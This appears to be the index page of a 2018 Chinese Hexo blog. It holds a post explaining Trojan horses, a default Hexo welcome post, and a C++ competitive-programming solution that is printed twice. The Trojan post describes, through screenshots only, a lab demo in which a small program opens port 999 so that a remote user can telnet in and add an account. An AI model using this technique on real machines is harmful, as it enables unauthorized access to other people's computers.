<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="utf-8">
  

  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="default">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Hexo">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
</head>
</html>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-Mini-Horse" class="article article-type-post" itemscope="" itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/11/22/Mini-Horse/" class="article-date">
  <time datetime="2018-11-21T17:27:51.000Z" itemprop="datePublished">2018-11-22</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/11/22/Mini-Horse/">Mini_Horse</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="名字由来"><a href="#名字由来" class="headerlink" title="名字由来"></a>名字由来</h2><p>“木马”这一名称来源于<a href="https://zh.wikipedia.org/wiki/%E5%B8%8C%E8%85%8A" target="_blank" rel="noopener">希腊</a>神话<a href="https://zh.wikipedia.org/wiki/%E7%89%B9%E6%B4%9B%E4%BC%8A%E6%88%B0%E7%88%AD" target="_blank" rel="noopener">特洛伊战争</a>的<a href="https://zh.wikipedia.org/wiki/%E7%89%B9%E6%B4%9B%E4%BC%8A%E6%9C%A8%E9%A6%AC" target="_blank" rel="noopener">特洛伊木马</a>。攻城的希腊联军佯装撤退后留下一只木马，特洛伊人将其当作战利品带回城内。当特洛伊人为胜利而庆祝时，从木马中出来了一队希腊兵，它们悄悄打开城门，放进了城外的军队，最终攻克了特洛伊城。计算机中所说的木马与病毒一样也是一种有害的程序，其特征与特洛伊木马一样具有伪装性，表面上没有危害、甚至还附有用户需要的功能，却会在用户不经意间，对用户的计算机系统产生破坏或窃取数据，特别是用户的各种账户及口令等重要且需要保密的信息，甚至控制用户的计算机系统。</p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>一个完整的特洛伊木马套装程序包含两部分：服务端（服务器部分）和客户端（控制器部分）。植入对方计算机的是服务端，而黑客正是利用客户端进入运行了服务端的计算机。运行了木马程序的服务端以后，会产生一个有着容易迷惑用户的名称的进程，暗中打开<a href="https://zh.wikipedia.org/wiki/%E5%9F%A0" target="_blank" rel="noopener">端口</a>，向指定地点发送数据（如<a href="https://zh.wikipedia.org/wiki/%E7%B6%B2%E8%B7%AF%E9%81%8A%E6%88%B2" target="_blank" rel="noopener">网上游戏</a>的<a href="https://zh.wikipedia.org/wiki/%E5%AF%86%E7%A2%BC" target="_blank" rel="noopener">密码</a>，<a href="https://zh.wikipedia.org/wiki/%E5%8D%B3%E6%97%B6%E9%80%9A%E8%AE%AF%E8%BD%AF%E4%BB%B6" target="_blank" rel="noopener">即时通信软件</a>密码和<a href="https://zh.wikipedia.org/wiki/%E7%94%A8%E6%88%B7" target="_blank" rel="noopener">用户</a>上网密码等），黑客甚至可以利用这些打开的端口进入计算机系统。</p>
<p>特洛伊木马程序不能自动操作， 一个特洛伊木马程序是包含或者安装一个存心不良的程序，它可能看起来是有用或者有趣的项目（或者至少无害）对一不怀疑的用户来说，但是实际上有害当它被运行。 特洛伊木马不会自动运行，它是暗含在某些用户感兴趣的文档中，用户下载时附带的。当用户运行文档程序时，特洛伊木马才会运行，信息或文档才会被破坏和丢失。 特洛伊木马和后门不一样，后门指隐藏在程序中的秘密功能，通常是程序设计者为了能在日后随意进入系统而设置的。</p>
<p>特洛伊木马分为两种，“Universale”和“Transitive”，“Universal”是可以控制，“Transitive”是无法控制，刻死的操作。</p>
<h2 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h2><p>特洛伊木马不经计算机用户准许就可获得<a href="https://zh.wikipedia.org/wiki/%E9%9B%BB%E8%85%A6" target="_blank" rel="noopener">计算机</a>的使用权。程序容量十分轻小，运行时不会浪费太多资源，因此没有使用杀毒软件是难以发觉的；运行时很难阻止它的行动，运行后，立刻自动<a href="https://zh.wikipedia.org/wiki/%E7%99%BB%E9%8C%84" target="_blank" rel="noopener">登录</a>在<a href="https://zh.wikipedia.org/w/index.php?title=%E7%B3%BB%E7%B5%B1%E5%95%9F%E5%8B%95%E5%8D%80&amp;action=edit&amp;redlink=1" target="_blank" rel="noopener">系统启动区</a>，之后每次在<a href="https://zh.wikipedia.org/wiki/Windows" target="_blank" rel="noopener">Windows</a>加载时自动运行；或立刻自动变更档名，甚至隐形；或马上自动复制到其他文件夹中，运行连用户本身都无法运行的动作；或浏览器自动连往奇怪或特定的网页。</p>
<h2 id="实践"><a href="#实践" class="headerlink" title="实践"></a><strong>实践</strong></h2><pre><code>一直对木马很感兴趣，迫切的想要知道木马会给受控制的PC带来什么样的安全隐患，Hacker又能得到什么样的权限与便利。之前有过机会，在实验室玩过冰河木马（国产的首个远程控制他人计算机的木马），感觉很刺激（虽然是虚拟的环境）
</code></pre><p>最近在看这方面的书，了解到最简单的Mini木马的实现原理。</p>
<pre><code>Mini木马不需要服务端，只需要一个客户端，负责打开客户机的某一个端口。Hacker就可以通过telnet远程连接到客户机。编程实现也很简单，只需要了解下Socket编程就好。演示一下效果
</code></pre><p>1.运行Mini.exe之前的客户机端口开放状态</p>
<p><img src="F:\blog\source\_posts\Mini-Horse\mini1.png" alt=""></p>
<p>2.运行后端口开放状态,发现打开了999端口</p>
<p><img src="F:\blog\source\_posts\Mini-Horse\mini2.png" alt=""></p>
<p>3.Hacker远程连接</p>
<p><img src="F:\blog\source\_posts\Mini-Horse\mini3.png" alt=""></p>
<p>4.连接成功</p>
<p><img src="F:\blog\source\_posts\Mini-Horse\mini4.png" alt=""></p>
<p>5.测试效果—DIR查看目录信息</p>
<p><img src="F:\blog\source\_posts\Mini-Horse\mini5.png" alt=""></p>
<p>6.添加账户</p>
<p><img src="F:\blog\source\_posts\Mini-Horse\mini6.png" alt=""></p>
<p><img src="F:\blog\source\_posts\Mini-Horse\mini7.png" alt=""></p>
<p><img src="F:\blog\source\_posts\Mini-Horse\mini8.png" alt=""></p>
<p>7.发现成功的远程在客户机添加了name为”hacker”的账户</p>
<p>8.如果客户机终止运行Mini.exe</p>
<p><img src="F:\blog\source\_posts\Mini-Horse\mini9.png" alt=""></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h2><p>安全意识、措施要到位，防火墙的配置，端口的检查，进程的识别、异常的终止，不能大意。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/11/22/Mini-Horse/" data-id="cjorg7gp50000t0tvf0mw2p8o" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-hello-world" class="article article-type-post" itemscope="" itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/11/21/hello-world/" class="article-date">
  <time datetime="2018-11-21T12:39:22.310Z" itemprop="datePublished">2018-11-21</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/11/21/hello-world/">Hello World</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/11/21/hello-world/" data-id="cjorg7grd0007t0tvple013gx" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-M的硬盘" class="article article-type-post" itemscope="" itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/11/21/M的硬盘/" class="article-date">
  <time datetime="2018-11-20T16:22:07.000Z" itemprop="datePublished">2018-11-21</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/11/21/M的硬盘/">M的硬盘</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>第一次写自己的题解,希望大家多多包含。</p>
<p>正题：附上题目链接<a href="http://acm.csu.edu.cn/csuoj/contest/problem?cid=2157&amp;pid=V" target="_blank" rel="noopener">http://acm.csu.edu.cn/csuoj/contest/problem?cid=2157&amp;pid=V</a></p>
<p>题目讲的是要实现对一个有序序列进行三种操作，并输出操作后的序列。</p>
<p>1.1 u   表示将u置于序列首</p>
<p>2.2 u 表示将u置于序列尾</p>
<p>3.3 u v 表示将u置于v后面</p>
<p>看到这种问题，这些操作，我当然想到的是链表</p>
<p>第一个思路：用了双向链表（头指针head，尾指针tail），但是提交time limit exceed.</p>
<p>仔细考虑之后发现由于后台给的测试数据较大，在用这种传统的指针双向链表时，由于每次操作多了一个“遍历查找”，所以超时是难以避免的。</p>
<p>换一个思路：用两个数组来模拟双向链表，lef[i]表示i左边的数据，righ[i]表示i右边的数据。这样一来，每次都能在O（1）的时间内找到源操作数，快速的多。而实现两个数的连接，可以用以下函数</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">link</span><span class="params">(<span class="keyword">int</span> L,<span class="keyword">int</span> R)</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">  righ[L]=R;</span><br><span class="line">  lef[R]=L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>直接附上源代码(C++)</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn=<span class="number">300000</span>+<span class="number">5</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*这题中的用两个数组模拟双向链表的思想与操作尤为金桥</span></span><br><span class="line"><span class="comment">特别是对于头指针、尾指针的设置*/</span></span><br><span class="line"><span class="keyword">int</span> lef[maxn];</span><br><span class="line"><span class="keyword">int</span> righ[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">link</span><span class="params">(<span class="keyword">int</span> L,<span class="keyword">int</span> R)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> T;</span><br><span class="line">    <span class="keyword">int</span> n,m;</span><br><span class="line">    <span class="keyword">int</span> order,a,b;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;T;</span><br><span class="line">    <span class="keyword">while</span>(T--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;n&gt;&gt;m;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n+<span class="number">1</span>;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            lef[i]=i<span class="number">-1</span>;</span><br><span class="line">            righ[i]=(i+<span class="number">1</span>)%(n+<span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        lef[<span class="number">0</span>]=n+<span class="number">1</span>;</span><br><span class="line">        righ[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">       righ[n+<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">     <span class="keyword">while</span>(m--)</span><br><span class="line">     &#123;</span><br><span class="line">     <span class="built_in">cin</span>&gt;&gt;order;</span><br><span class="line">       <span class="keyword">if</span>(order==<span class="number">1</span>)</span><br><span class="line">       &#123;</span><br><span class="line">           <span class="built_in">cin</span>&gt;&gt;a;</span><br><span class="line"></span><br><span class="line">          link(lef[a],righ[a]);<span class="comment">//置顶前奏</span></span><br><span class="line"></span><br><span class="line">           <span class="comment">//置顶的操作</span></span><br><span class="line">          link(a,righ[<span class="number">0</span>]);</span><br><span class="line">          link(<span class="number">0</span>,a);</span><br><span class="line"></span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">else</span> <span class="keyword">if</span>(order==<span class="number">2</span>)</span><br><span class="line">       &#123;</span><br><span class="line">           <span class="built_in">cin</span>&gt;&gt;a;</span><br><span class="line">           link(lef[a],righ[a]);<span class="comment">//至尾前奏</span></span><br><span class="line"></span><br><span class="line">           <span class="comment">//至尾操作</span></span><br><span class="line">           <span class="comment">//注意先后顺序</span></span><br><span class="line">           link(lef[n+<span class="number">1</span>],a);</span><br><span class="line">           link(a,n+<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">else</span> <span class="keyword">if</span>(order==<span class="number">3</span>)</span><br><span class="line">       &#123;</span><br><span class="line">           <span class="built_in">cin</span>&gt;&gt;a&gt;&gt;b;</span><br><span class="line">           link(lef[a],righ[a]);</span><br><span class="line">           link(a,righ[b]);</span><br><span class="line">           link(b,a);</span><br><span class="line"></span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> b=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        b=righ[b];</span><br><span class="line">           <span class="built_in">cout</span>&lt;&lt;b&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    b=righ[b];</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;b&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">     &#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">link</span><span class="params">(<span class="keyword">int</span> L,<span class="keyword">int</span> R)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    righ[L]=R;</span><br><span class="line">    lef[R]=L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>另外解释一下为什么两个数组名没用left,right.因为本人的编译器的原因，似乎是ios_base::right已经存在关键词，具体也不懂。</p>
<p>哪位能解释一下，在下小白感激不尽！！</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>第一次写自己的题解,希望大家多多包含。</p>
<p>正题：附上题目链接<a href="http://acm.csu.edu.cn/csuoj/contest/problem?cid=2157&amp;pid=V" target="_blank" rel="noopener">http://acm.csu.edu.cn/csuoj/contest/problem?cid=2157&amp;pid=V</a></p>
<p>题目讲的是要实现对一个有序序列进行三种操作，并输出操作后的序列。</p>
<p>1.1 u   表示将u置于序列首</p>
<p>2.2 u 表示将u置于序列尾</p>
<p>3.3 u v 表示将u置于v后面</p>
<p>看到这种问题，这些操作，我当然想到的是链表</p>
<p>第一个思路：用了双向链表（头指针head，尾指针tail），但是提交time limit exceed.</p>
<p>仔细考虑之后发现由于后台给的测试数据较大，在用这种传统的指针双向链表时，由于每次操作多了一个“遍历查找”，所以超时是难以避免的。</p>
<p>换一个思路：用两个数组来模拟双向链表，lef[i]表示i左边的数据，righ[i]表示i右边的数据。这样一来，每次都能在O（1）的时间内找到源操作数，快速的多。而实现两个数的连接，可以用以下函数</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">link</span><span class="params">(<span class="keyword">int</span> L,<span class="keyword">int</span> R)</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">  righ[L]=R;</span><br><span class="line">  lef[R]=L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>直接附上源代码(C++)</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn=<span class="number">300000</span>+<span class="number">5</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*这题中的用两个数组模拟双向链表的思想与操作尤为金桥</span></span><br><span class="line"><span class="comment">特别是对于头指针、尾指针的设置*/</span></span><br><span class="line"><span class="keyword">int</span> lef[maxn];</span><br><span class="line"><span class="keyword">int</span> righ[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">link</span><span class="params">(<span class="keyword">int</span> L,<span class="keyword">int</span> R)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> T;</span><br><span class="line">    <span class="keyword">int</span> n,m;</span><br><span class="line">    <span class="keyword">int</span> order,a,b;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;T;</span><br><span class="line">    <span class="keyword">while</span>(T--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;n&gt;&gt;m;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n+<span class="number">1</span>;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            lef[i]=i<span class="number">-1</span>;</span><br><span class="line">            righ[i]=(i+<span class="number">1</span>)%(n+<span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        lef[<span class="number">0</span>]=n+<span class="number">1</span>;</span><br><span class="line">        righ[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">       righ[n+<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">     <span class="keyword">while</span>(m--)</span><br><span class="line">     &#123;</span><br><span class="line">     <span class="built_in">cin</span>&gt;&gt;order;</span><br><span class="line">       <span class="keyword">if</span>(order==<span class="number">1</span>)</span><br><span class="line">       &#123;</span><br><span class="line">           <span class="built_in">cin</span>&gt;&gt;a;</span><br><span class="line"></span><br><span class="line">          link(lef[a],righ[a]);<span class="comment">//置顶前奏</span></span><br><span class="line"></span><br><span class="line">           <span class="comment">//置顶的操作</span></span><br><span class="line">          link(a,righ[<span class="number">0</span>]);</span><br><span class="line">          link(<span class="number">0</span>,a);</span><br><span class="line"></span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">else</span> <span class="keyword">if</span>(order==<span class="number">2</span>)</span><br><span class="line">       &#123;</span><br><span class="line">           <span class="built_in">cin</span>&gt;&gt;a;</span><br><span class="line">           link(lef[a],righ[a]);<span class="comment">//至尾前奏</span></span><br><span class="line"></span><br><span class="line">           <span class="comment">//至尾操作</span></span><br><span class="line">           <span class="comment">//注意先后顺序</span></span><br><span class="line">           link(lef[n+<span class="number">1</span>],a);</span><br><span class="line">           link(a,n+<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">else</span> <span class="keyword">if</span>(order==<span class="number">3</span>)</span><br><span class="line">       &#123;</span><br><span class="line">           <span class="built_in">cin</span>&gt;&gt;a&gt;&gt;b;</span><br><span class="line">           link(lef[a],righ[a]);</span><br><span class="line">           link(a,righ[b]);</span><br><span class="line">           link(b,a);</span><br><span class="line"></span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> b=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        b=righ[b];</span><br><span class="line">           <span class="built_in">cout</span>&lt;&lt;b&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    b=righ[b];</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;b&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">     &#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">link</span><span class="params">(<span class="keyword">int</span> L,<span class="keyword">int</span> R)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    righ[L]=R;</span><br><span class="line">    lef[R]=L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>另外解释一下为什么两个数组名没用left,right.因为本人的编译器的原因，似乎是ios_base::right已经存在关键词，具体也不懂。</p>
<p>哪位能解释一下，在下小白感激不尽！！</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/11/21/M的硬盘/" data-id="cjorg7gqu0001t0tvwyp7uww8" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/acm-算法/">acm 算法</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-PE--导入导出表" class="article article-type-post" itemscope="" itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/11/21/PE--导入导出表/" class="article-date">
  <time datetime="2018-11-20T16:20:53.000Z" itemprop="datePublished">2018-11-21</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
